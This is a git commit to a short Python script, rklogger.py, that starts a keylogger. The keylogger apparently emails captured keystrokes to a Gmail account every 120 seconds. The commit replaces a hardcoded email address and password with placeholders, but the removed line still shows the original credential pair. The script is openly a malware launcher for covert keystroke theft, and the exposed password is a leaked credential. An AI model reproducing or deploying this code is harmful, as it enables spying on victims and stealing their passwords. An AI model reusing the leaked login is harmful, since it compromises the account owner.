3db873872e8eb0bf14e3bbfabaee173b0a1d0574
rudraskhkarpe <rudraksh.karpe.cs@ghrcem.raisoni.net>
2021-08-15 04:56:05 +0530

    Removed the private credentials

--- rklogger.py
+++ rklogger.py
@@ -1,4 +1,4 @@
 import keylogger
 
-my_keylogger = keylogger.Keylogger(120, "rklogger0001@gmail.com","Rudraksh@143")
+my_keylogger = keylogger.Keylogger(120, "youremail@gmail.com","password")
 my_keylogger.start()
